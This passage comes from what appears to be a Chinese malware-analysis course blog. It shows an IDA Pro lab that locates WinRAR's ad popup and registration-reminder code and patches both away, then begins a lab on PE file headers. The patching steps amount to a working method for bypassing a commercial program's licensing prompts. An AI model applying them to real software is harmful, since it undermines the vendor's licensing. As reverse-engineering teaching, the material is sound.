class="hljs-type">int</span>nWidth,</span><br><span class="hljs-params"><span class="hljs-type">int</span>nHeight, </span><br><span class="hljs-params">HWNDhWndParent, </span><br><span class="hljs-params">HMENUhMenu, </span><br><span class="hljs-params">HINSTANCEhInstance, </span><br><span class="hljs-params">LPVOIDlpParam </span><br><span class="hljs-params">&gt;)</span>;<br></code></pre></td></tr></table></figure><p>​        以上定义中，LPCWSTR是使用了“宽字符”构成的字符串，简单说就是每个符号占用2个字节，而不是经典的C-Style字符串所定义的一个符号使用1字节表示。</p></blockquote><h4 id="2-2-1-查找API函数"><a href="#2-2-1-查找API函数" class="headerlink" title="2.2.1 查找API函数"></a>2.2.1 查找API函数</h4><p>​        通过分析可知创建弹窗的API有可能是CreateWindowExW，那么就可以设置这个API函数断点进行调试分析。使用IDA Pro可以有多种方式查找可以使用设置断点的API函数，这里介绍使用导入表查找可用的API函数。</p><p><img src="http://wxjb.jspi.cn/g/query/aac46640-9bd5-4bfd-bc61-d4387c68e858" alt="导入表"></p><center>图4 Import 导入函数列表</center><p>​        IDA Pro默认打开分析程序后，会在窗口中自动打开名为Imports的标签页，其中显示的是当前分析PE格式文件的导入函数，表格中包含了常用的“函数地址”，“API函数名”和“函数所在的库”等数据列。在使用过程中可以通过单击列标题实现对数据的排序，方便快速查看所需要的函数。</p><blockquote><p>​        使用技巧：可以在imports界面输入所需要查找函数的前几个字符，这样导入表会按照输入进行快速筛选。例如图4中输入了createwin，界面中就自动高亮度筛选出了CreateWindowExW函数。</p></blockquote><p><img src="http://wxjb.jspi.cn/g/query/37b03203-cd21-42e8-9415-7019c11fb138" alt="API函数"></p><center>图5 CreateWindowExW函数</center><p>​        查找到所需要的API函数后，可以双击该项目，就会进入到该函数的反汇编代码窗口，如图5所示。通过该界面获得函数的一些基本信息，如函数名，参数个数和类型，函数的返回值等。由于是库函数，这里是显示了函数的声明，并不显示具体的函数反汇编指令。</p><h4 id="2-2-2-设置断点"><a href="#2-2-2-设置断点" class="headerlink" title="2.2.2 设置断点"></a>2.2.2 设置断点</h4><p>​        在图3中打开的Windows API函数界面中，具体就是在CreateWindowExW上单击右键，选择右键菜单中的“Add Breakpoint”项目，打开断点设置窗口。</p><blockquote><p>使用技巧：在代码中选择适合的API函数后单击F2键，可以快速打开以上断点设置窗口。</p></blockquote><p><img src="http://wxjb.jspi.cn/g/query/93ea0b78-4e31-4771-96e6-08fe127cb2d7" alt="断点设置窗口"></p><center>图6 断点设置对话框</center><p>​        在打开的断点设置窗口中Location中已经自动填入了我们选择好的API函数的入口地址，不需要修改。单击OK按钮就能添加CreateWindowExW函数的访问断点。</p><blockquote><p>​        图6界面中Condition可以填入IDC脚本函数或表达式计算，当计算结果为真时，触发该断点。<br>例如输入 get_wide_dword(ESP+0x4) &#x3D;&#x3D; 0x100 表示当代码执行到CreateWindowExW时，如果当前的ESP+0x4这个内存位置中的DWORD数值为0x100，那么断点就触发。</p><p>​        IDC函数可以参考：<a href="https://www.hex-rays.com/products/ida/support/idadoc/162.shtml">https://www.hex-rays.com/products/ida/support/idadoc/162.shtml</a></p></blockquote><p>​        由前文分析可知广告弹窗的窗口样式的数值为16CB0000，是CreateWindowExW函数的第4个参数。函数调用规范是stadcall，因此所需参数可以使用以下方式获得：<br>​        栈顶可以使用get_wide_dword(ESP)获得，<br>​        第1个参数使用 get_wide_dword(ESP+4)，<br>​        第2个参数使用 get_wide_dword(ESP+8)，<br>​        …… 。</p><p>​        图6界面中，Condition中填写 <code>get_wide_dword(ESP+0x10) == 0x16CB0000</code>。</p><h4 id="2-2-3-调试分析"><a href="#2-2-3-调试分析" class="headerlink" title="2.2.3 调试分析"></a>2.2.3 调试分析</h4><ol><li>启动调试</li></ol><p>​        完成以上的断点设置后，可以单击F9启动调试。理想的状态是运行后，触发断点后程序停止在我们所需要的断点位置。但实际情况往往会有各类的警告信息，以及系统的各类异常等情况的中断，因此一般情况下可以单击弹出的对话框确定继续，或者再次按下F9继续调试。</p><p>​        <em>注意：在每次按下F9调试前，请检测以下Stack view，查看一下栈中的数据是否和需要捕获的窗口的数据一致。本例子中，就是需要查看 参数16CB0000是否出现在栈中。</em></p><p><img src="http://wxjb.jspi.cn/g/query/f39fb862-9c06-4622-80ce-33d762a3a366" alt="捕获"></p><center>图7 中断界面</center><p>​        图7中右下角的Stack View中，蓝色条标记的是栈顶，即<code>ESP==0x0104BBD8</code>，而<code>ESP+0x10==0x0104BBE8</code>,对应的内存中数据为0x16CB0000，正是我们查找的窗口，此时程序中断在构建广告窗口的代码中CreateWindowExW函数的调用前。</p><ol start="2"><li>查看分析代码</li></ol><p>​        以上的断点暂停的位置是CreateWindowExW函数的入口，但此时并不需要分析该函数，需要分析的是调用该指令的代码块，即该函数执行完返回地址。按照函数调用的规范，此时栈顶中数据就是返回后执行代码地址，因此<strong>双击栈顶地址</strong>就能打开调用的代码。在上图界面中右下角子窗口中，双击Stack View界面中sub_1121410+3D2就进入如图6所示界面。</p><p><img src="http://wxjb.jspi.cn/g/query/f1955265-bbe6-42b8-b7bd-485dcc8d4c68" alt="函数调用"></p><center>图8 广告弹窗调用代码</center><p>​        图8中反汇编代码显示的部分就是广告弹窗构造代码，代码使用<code>call ds:CreateWindowExW</code>指令调用CreateWindowExW函数，创建广告弹出窗口。</p><p>​        以上反汇编代码中，call指令前是一系列的push指令，是采用栈传输函数所需的参数，期中就包含了窗口大小，位置以及窗口样式等信息，这些和API函数定义是一致的。</p><p>​        通过以上的断点调试分析，可以初步确定广告弹窗启动代码地址，可以记录下当前的代码位置，然后使用Ctrl-F2快捷键关闭调试。</p><h2 id="3-静态分析与破解"><a href="#3-静态分析与破解" class="headerlink" title="3.静态分析与破解"></a>3.静态分析与破解</h2><h3 id="3-1-弹窗静态代码分析"><a href="#3-1-弹窗静态代码分析" class="headerlink" title="3.1 弹窗静态代码分析"></a>3.1 弹窗静态代码分析</h3><p>​        由上一节的分析，可以获得广告弹窗的CreateWindowExW函数的调用代码段如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:011217AD loc_11217AD:                            ; CODE XREF: sub_1121410+307↑j<br>.text:011217AD                                         ; sub_1121410+314↑j<br>.text:011217AD push    100h                            ; size_t<br>.text:011217B2 push    offset byte_11A6F18             ; char *<br>.text:011217B7 call    sub_1120AE0<br>.text:011217BC push    0                               ; lpParam          --start--<br>.text:011217BE push    hInstance                       ; hInstance<br>.text:011217C4 push    0                               ; hMenu<br>.text:011217C6 push    0                               ; hWndParent<br>.text:011217C8 push    edi                             ; nHeight<br>.text:011217C9 push    esi                             ; nWidth<br>.text:011217CA push    ebp                             ; Y<br>.text:011217CB push    [esp+1044h+X]                   ; X<br>.text:011217CF push    ebx                             ; dwStyle<br>.text:011217D0 push    offset WindowName               ; &quot;WinRAR&quot;<br>.text:011217D5 push    offset aRarreminder             ; &quot;RarReminder&quot;<br>.text:011217DA push    0                               ; dwExStyle<br>.text:011217DC call    ds:CreateWindowExW              ;                   ---end--<br>.text:011217E2 test    byte ptr dword_11A6BA8, 1<br>.text:011217E9 pop     edi<br>.text:011217EA pop     ebp<br></code></pre></td></tr></table></figure><p>​        查看以上代码6-18行，是调用CreateWindowExW，构造弹窗。如果屏蔽call指令是否能禁止弹窗？按照这个思路下面介绍具体的实验方法，完成广告弹窗的屏蔽操作。</p><h3 id="3-2-去弹窗修复"><a href="#3-2-去弹窗修复" class="headerlink" title="3.2 去弹窗修复"></a>3.2 去弹窗修复</h3><p>​        IDA Pro作为强大静态反编译分析工具，具有强大的二进制文件修改功能，这里主要使用的是汇编和补丁两个功能。</p><ol><li>修改汇编代码，绕过call指令调用。</li></ol><p>​        在IDA Pro汇编窗口中，找到入栈的第一个参数位置，即以上代码中的第6行代码（标记注释start位置）处。将光标点击这个地址，然后依次打开菜单项目<code>Edit-&gt;Patch Program-&gt;Assemble...</code>，在弹出的对话框中输入汇编指令，如图9。</p><p><img src="http://wxjb.jspi.cn/g/query/094e3963-30bd-4873-84c6-328da4c47bcd" alt="汇编修改代码"></p><center>图9 汇编修改的指令</center><p>​        以上代码中JMP跳转指令，011217E2是Call指令的下一条指令地址。经过以上的修改，程序将跳过广告窗口的构造指令，实现去除广告弹窗的目的。</p><ol start="2"><li>补丁文件输出，实现去弹窗。</li></ol><p>​        以上的修改仅仅是实现了IDA Pro数据库文件的修改，并没有对exe可执行文件进行修改，如果要将修改的结果写入可执行文件，就需要使用IDA Pro的补丁（patch）功能。</p><p>​        操作菜单：<code>Edit-&gt;Patch Program-&gt;Apply patches to input file...</code></p><p><img src="http://wxjb.jspi.cn/g/query/0ffc7af1-da03-4fdc-8a3e-42c9103fb8d4" alt="补丁文件"></p><center>图10 应用补丁</center><p>​        单击Create backup选项后，单击OK即可补丁程序文件。</p><p>​        <strong>注意：如果补丁文件时处于调式状态，将无法写入文件，因此在补丁文件前，需要终止代码调试。具体方法是单击调试工具栏中蓝色方块按钮。或者使用快捷键Ctrl-F2。</strong></p><p>​       经过补丁后的程序启动后，将不再出现广告弹窗，但随之会出现一个软件注册提示框，以下介绍如果清除这个注册提示框。</p><h3 id="3-3-注册弹窗静态代码分析与破解"><a href="#3-3-注册弹窗静态代码分析与破解" class="headerlink" title="3.3 注册弹窗静态代码分析与破解"></a>3.3 注册弹窗静态代码分析与破解</h3><p>​        从软件的执行顺序可以推测软件注册对话框的启动应该是在广告弹窗的代码后面，因此重新打开IDA Pro的代码窗口，定位到前面分析的弹窗地址。</p><blockquote><p>如果前面已经把弹窗地址记录下来，只要单击g，然后输入地址，就能打开到弹窗指令所在的代码位置。此时可以逐条向后分析指令，也可以继续使用调试器的F8指令，逐条指令分析。</p></blockquote><p>​        因为Winrar软件没有使用特殊的加密和混淆手段，所以可以使用更方便的方法，使用IDA Pro的Hex-Rays Decompiler插件，将汇编代码恢复成类C语言的代码分析，大大提高代码的分析效率。</p><p>​        Hex-Rays插件的激活快捷按钮为<code>F5</code>，在反汇编窗口单击次快捷键后，将会自动反编译成C语言，如图11。</p><p><img src="http://wxjb.jspi.cn/g/query/a85e7f72-ee40-4053-91ab-4280ebdeffe7" alt="Hex-Rays"></p><center>图11 Hex-Ray反编译引擎反编译</center><p>​        通过逐行阅读代码，注意到142行代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v7 )<br> &#123;<br>   byte_A6A064 = <span class="hljs-number">1</span>;<br>   v20 = GetFocus();<br>   DialogBoxParamW(hInst, <span class="hljs-string">L&quot;REMINDER&quot;</span>, v20, sub_9C3D40, <span class="hljs-number">0</span>);<br> &#125;<br></code></pre></td></tr></table></figure><p>​        DialogBoxParamW是Windows自带的一个API函数，用于构造一个对话框窗口，其中第4个参数是指向一个窗口指向代码，双击sub_9c3D40这个子程序，得到如下代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">sub_9C3D40</span><span class="hljs-params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *v4; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  WCHAR Filename; <span class="hljs-comment">// [esp+8h] [ebp-1004h]</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">sub_8FCD40</span>(hDlg, a2, a3, a4, <span class="hljs-string">L&quot;REMINDER&quot;</span>, (<span class="hljs-type">int</span>)<span class="hljs-string">L&quot;HELPLicenseAndRegistering&quot;</span>, <span class="hljs-number">0</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">273</span> )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> __int16)a3 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        <span class="hljs-built_in">EndDialog</span>(hDlg, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        <span class="hljs-built_in">EndDialog</span>(hDlg, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>     <span class="hljs-comment">// ......</span><br>     <span class="hljs-comment">// 此处省略部分代码</span><br>     <span class="hljs-comment">// ......</span><br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x64</span>u:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x65</span>u:<br>        <span class="hljs-built_in">GetModuleFileNameW</span>(<span class="hljs-number">0</span>, &amp;Filename, <span class="hljs-number">0x800</span>u);<br>        <span class="hljs-built_in">sub_968FB0</span>(&amp;Filename, (<span class="hljs-type">int</span>)<span class="hljs-string">L&quot;order.htm&quot;</span>, <span class="hljs-number">2048</span>);<br>        <span class="hljs-built_in">sub_9782D0</span>(&amp;Filename, &amp;Filename, <span class="hljs-number">2048</span>);<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">GetFileAttributesW</span>(&amp;Filename) == <span class="hljs-number">-1</span> )<br>        &#123;<br>          v6 = <span class="hljs-built_in">sub_978530</span>(<span class="hljs-number">0x1F5</span>u);<br>          <span class="hljs-built_in">sub_9BF640</span>(v6, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;Filename);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">ShellExecuteW</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;Filename, <span class="hljs-number">0</span>, &amp;Directory, <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x66</span>u:<br>        v4 = (<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *)<span class="hljs-built_in">sub_978530</span>(<span class="hljs-number">0x4F7</span>u);<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">wcschr</span>(v4, <span class="hljs-number">0x20</span>u) )<br>          v4 = (<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *)<span class="hljs-built_in">sub_978530</span>(<span class="hljs-number">0x4F6</span>u);<br>        <span class="hljs-built_in">ShellExecuteW</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, v4, <span class="hljs-number">0</span>, &amp;Directory, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​        此时发现第7行，27行代码中，出现的HELPLicenseAndRegistering和order.htm与软件授权注册和订单有关的英文，结合软件注册的功能，可以推测此处为注册对话框。</p><p>​        分析至此，绕过注册对话框的方式可以通过修改142行c代码中的if语言即可。由于不能直接修改c代码，必须切换到IDA View-A反汇编界面，<strong>单击右键选择synchronize with菜单</strong>，然后选择刚才c语言伪代码窗口，笔者此时窗口为pseudocode-B，反汇编窗口会显示142行c代码中对应汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">text:00991812 loc_991812:                             ; CODE XREF: sub_991410+117↑j<br>.text:00991812                 test    bl, bl<br>.text:00991814                 jz      short loc_99183C<br>.text:00991816                 push    0               ; dwInitParam<br>.text:00991818                 push    offset sub_9C3D40 ; lpDialogFunc<br>.text:0099181D                 mov     byte_A6A064, 1<br>.text:00991824                 call    ds:GetFocus<br>.text:0099182A                 push    eax             ; hWndParent<br>.text:0099182B                 push    offset aReminder ; &quot;REMINDER&quot;<br>.text:00991830                 push    hInst           ; hInstance<br>.text:00991836                 call    ds:DialogBoxParamW<br>.text:0099183C<br></code></pre></td></tr></table></figure><p>​        分析以上代码第2行就是判断是否显示注册窗口，这里将jz修改成jmp指令就可以消除注册对话框。具体修改方法可以参考前面的补丁文件的方式。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>​        通过分析Winrar弹窗代码，并进行补丁修改。可以体会到IDA Pro不但是一款强大的静态分析工具，也是具有完整动态分析能力的。由于静态分析的强大，使得在动态分析的时候，可以看到很多软件自动分析出来的辅助信息，极大的方便了代码功能的判断。例如凡是出现一个地址指向了一个字符串的指令，往往都是在后面自动添加上注释。</p><p>​        在软件逆向分析中，分析代码的行为与本次实验中查找弹窗，改变代码功能都有类似的地方。因此可以得到一些简单的结论。</p><ol><li>静态分析软件强大的分析功能可以有效的帮助分析人员了解代码功能和程序走向。</li><li>动态分析需要静态分析的结果会更有助于分析。</li><li>一般动态调试相比静态分析，更容易。</li></ol><h2 id="5-实验考核点及问题"><a href="#5-实验考核点及问题" class="headerlink" title="5.实验考核点及问题"></a>5.实验考核点及问题</h2><ul><li><p>Spy++软件使用，能正确查找窗口参数，如CreateWindowsExW函数所需要的参数信息。</p></li><li><p>IDA Pro软件断点的设置，能正确对API访问设置断点；会简单的条件断点条件的设置。</p></li><li><p>掌握IDA Pro软件中正确汇编指令并制作补丁修改文件的能力。</p></li></ul><ol><li>在绕过Winrar广告窗口的操作中，需要设置断点的API是（                  ）。</li><li>IDA Pro中使用（         ）插件能反编译机器指令，生成的伪C程序代码。</li><li>在设置条件断点时，如果需要对左起第2个长度为4字节的参数值为0x12345678,那么条件断点的条件（Condition处）怎么写（             ）。</li><li>IDA Pro将被分析的程序保存为扩展名为（      ）的数据库文件，在之后的分析过程中（要&#x2F;不要）原始程序文件。</li><li>IDA Pro中类似<code>sub_1121410+3D2</code>这样标记含义是（                 ）。</li><li>IDA Pro中给变量或者函数命名的快捷键是（             ）。</li><li>实验调试时，针对CreateWindowEx设置的断点，当中断到断点时，可以使用那些方法找到（或者说是返回）到这个函数调用后的用户指令的位置？请给出至少3种方案。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构分析实验</title>
    <link href="/2024/10/24/111/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/"/>
    <url>/2024/10/24/111/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="实验：PE文件结构分析实验"><a href="#实验：PE文件结构分析实验" class="headerlink" title="实验：PE文件结构分析实验"></a>实验：PE文件结构分析实验</h1><h2 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、 实验目的"></a>一、 实验目的</h2><ol><li>掌握PE文件基本结构</li><li>掌握PE文件分析常用工具的使用</li></ol><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>操作系统：Windows 7&#x2F;8&#x2F;10</p><p>实验对象：PE文件（实验主机随机选取，如notepad.exe）</p><p>实验软件：<a href="http://172.17.200.225/gyf/Malware/HxDSetup.zip">HxD</a>，<a href="http://172.17.200.225/gyf/Malware/ExeinfoPE%20v0.0.6.1%20II.zip">ExeinfoPE</a>，PEViewer，<a href="http://172.17.200.225/gyf/Malware/LordPE14.zip">LordPE</a>，<a href="http://172.17.200.225/gyf/Malware/PEiD.0.95.zip">PEiD</a></p><h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><h3 id="1-实验背景"><a href="#1-实验背景" class="headerlink" title="1. 实验背景"></a>1. 实验背景</h3><p>​        PE文件是Windows操作系统中可执行的程序文件。PE是Portable Executable的缩写，意为“可移植的、可执行的”，表示一个可执行文件可以在多种操作系统中运行。PE文件格式是在UNIX可执行文件COFF（Common Object File Format，通用对象文件格式）基础上创建而成的。常见的EXE，DLL，OBJ，SYS等都是PE文件。</p><p>​        许多恶意程序都是PE文件，拥有PE文件结构，因此学习和掌握PE文件结构是深入学习恶意代码分析课程的基础知识储备。</p><h3 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2.实验内容"></a>2.实验内容</h3><p>​        PE文件是二进制格式文件，具有复杂的格式定义，每个字节都赋予了特定的含义。为了方便描述，通常会借助C语言中结构体定义的方式来说明每个有意义的字段。</p><p>​        PE文件格式为了兼容DOS时代的可执行程序，因此在PE文件头部使用了完整的DOS头部数据结构，紧跟在DOS头后面就是PE数据结构。</p><p>​        PE头部数据结构可以分成两个部分，一个是PE头，另一个是PE节区。</p><p>​        PE头中包含文件执行时所需的一般信息，包括执行文件时最初执行代码的起始部分信息，驱动应用程序的平台信息等。</p><p>​        PE节区中包含组成程序的汇编代码，通常恶意代码分析中逆向分析的对象；源代码中声明的全局变量与static变量；以及程序中使用的图片、文档文件等资源。</p><p>​        PE文件结构如图 1所示。本次实验需要使用常用的PE文件查看分析软件工具，对Windows中的PE文件进行分析，查找主要的组成结构，对关键的数据，如IMAGE_DOS_HEADER和IMAGE_NT_HEADER结构体的数据进行查看，了解掌握关键字段，如<strong>e_lfanew</strong>，PE标志字段……</p><p><img src="http://wxjb.jspi.cn/g/query/113b5189-3638-496f-82ed-672bcd913c39" alt="pe文件结构"></p><center> 图1 PE文件结构</center><blockquote><p>关于PE结构，还可以参考<a href="http://wxjb.jspi.cn/g/query/d80785e7-3589-4dad-a587-63cb814d536c">PE文件格式图解</a>，<a href="http://wxjb.jspi.cn/g/query/17558797-daf8-4eef-b1bc-2ecceef13d67">PE文件结构样例图解</a>，<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">PE格式微软定义</a></p></blockquote><h2 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h2><h3 id="1-观察DOS头部数据"><a href="#1-观察DOS头部数据" class="headerlink" title="1. 观察DOS头部数据"></a>1. 观察DOS头部数据</h3><p>​        DOS头的作用是兼容MS-DOS操作系统中的可执行文件，对于32位PE文件来说，DOS所起的作用就是显示一行文字，提示用户：我需要在32位Windows上才可以运行，通常是显示为：“This program cannot be run in DOS mode”。</p><p>为了能清晰的说明DOS头的结构，通常会使用C语言结构体定义的方式表示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="hljs-comment">// DOS .EXE header</span><br>    WORD   e_magic;                     <span class="hljs-comment">// Magic number: 0x5a4d</span><br>    WORD   e_cblp;                      <span class="hljs-comment">// Bytes on last page of file</span><br>    WORD   e_cp;                        <span class="hljs-comment">// Pages in file</span><br>    WORD   e_crlc;                      <span class="hljs-comment">// Relocations</span><br>    WORD   e_cparhdr;                   <span class="hljs-comment">// Size of header in paragraphs</span><br>    WORD   e_minalloc;                  <span class="hljs-comment">// Minimum extra paragraphs needed</span><br>    WORD   e_maxalloc;                  <span class="hljs-comment">// Maximum extra paragraphs needed</span><br>    WORD   e_ss;                        <span class="hljs-comment">// Initial (relative) SS value</span><br>    WORD   e_sp;                        <span class="hljs-comment">// Initial SP value</span><br>    WORD   e_csum;                      <span class="hljs-comment">// Checksum</span><br>    WORD   e_ip;                        <span class="hljs-comment">// Initial IP value</span><br>    WORD   e_cs;                        <span class="hljs-comment">// Initial (relative) CS value</span><br>    WORD   e_lfarlc;                    <span class="hljs-comment">// File address of relocation table</span><br>    WORD   e_ovno;                      <span class="hljs-comment">// Overlay number</span><br>    WORD   e_res[<span class="hljs-number">4</span>];                    <span class="hljs-comment">// Reserved words</span><br>    WORD   e_oemid;                     <span class="hljs-comment">// OEM identifier (for e_oeminfo)</span><br>    WORD   e_oeminfo;                   <span class="hljs-comment">// OEM information; e_oemid specific</span><br>    WORD   e_res2[<span class="hljs-number">10</span>];                  <span class="hljs-comment">// Reserved words</span><br>    LONG   e_lfanew;                    <span class="hljs-comment">// File address of new exe header 0x3c</span><br>  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;<br></code></pre></td></tr></table></figure><p>​        以上定义的结构体中，第一个字段，e_magic，是2字节宽度的整数，值是常数0x4D5A，用文本编辑器查看该值为‘MZ’，如图 2使用“HxD”软件打开操作系统自带的“画图”（c:\windows\SysWoW64\mspaint.exe）程序文件开头显示，需要说明的是配图是在Windows7 32位环境下打开的文件，所以显示路径是system32文件夹，但现在Windows10 64位实验环境下，需要更改为SysWow64文件夹中。以下所有文档配图均按照这个规则查看。</p><blockquote><p>​         本课程实验分析环境为Windows64位，如果分析32位系统自带的程序，例如记事本（notepad.exe）就应该打开<code>C:\Windows\SysWoW64\notepad.exe</code>，而不能打开System32文件夹内的64位程序版本。</p></blockquote><p><img src="http://wxjb.jspi.cn/g/query/1939ae4e-9e76-45b9-ad59-e7d03ecc93c8" alt="mspaint文件分析"></p><center> 图2 mspaint.exe的e_magic字段</center><p>​        IMAGE_DOS_HEADER结构最后一个字段e_lfanew是4字节数据，用来表示DOS头之后的PE头的位置，即相对文件起始地址的偏移位置。<strong>通过IMAGE_DOS_HEADER结构体各字段的长度可以计算出e_lfanew字段是位于文件头偏移0x3c位置</strong>，图 2中其值为0x000000E8，这里请特别注意长度为4字节的数据，在文件中存储使用了小端存储，也就是32位数据中低位先存储，这样E8会先存储在0x3c位置，而且3个字节的0会以此向后保存。这是在文件中阅读数据时需要注意的。</p><blockquote><p>​        通常的PE文件DOS头结构是稳定的，所以0x3C这个数据可以记忆下来，通过这个文件的偏移，能够快速定位PE头位置。<br>​        PE文件中数组是按照低地址到高地址查看，其他数据都是按照小端存储查看，特别需要注意的是如果是整数数字，那么元素之间是按照从低地址到高地址，但是每个元素自身的4个字节是按照小端存储，所以需要倒过来看！</p></blockquote><h3 id="2-查看PE头数据"><a href="#2-查看PE头数据" class="headerlink" title="2. 查看PE头数据"></a>2. 查看PE头数据</h3><p>​        PE头也称为NT头，微软公司在其开发文档winnt.h头文件中进行了如下定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS</span> &#123;</span><br>    DWORD Signature;                        <span class="hljs-comment">// Signature == 0x00004550， 4字节</span><br>    IMAGE_FILE_HEADER FileHeader;           <span class="hljs-comment">// 20（0x14）字节</span><br>    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="hljs-comment">// 96 + 8x16 = 224(0xE0)</span><br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; <span class="hljs-comment">// 0xF8</span><br></code></pre></td></tr></table></figure><p>​        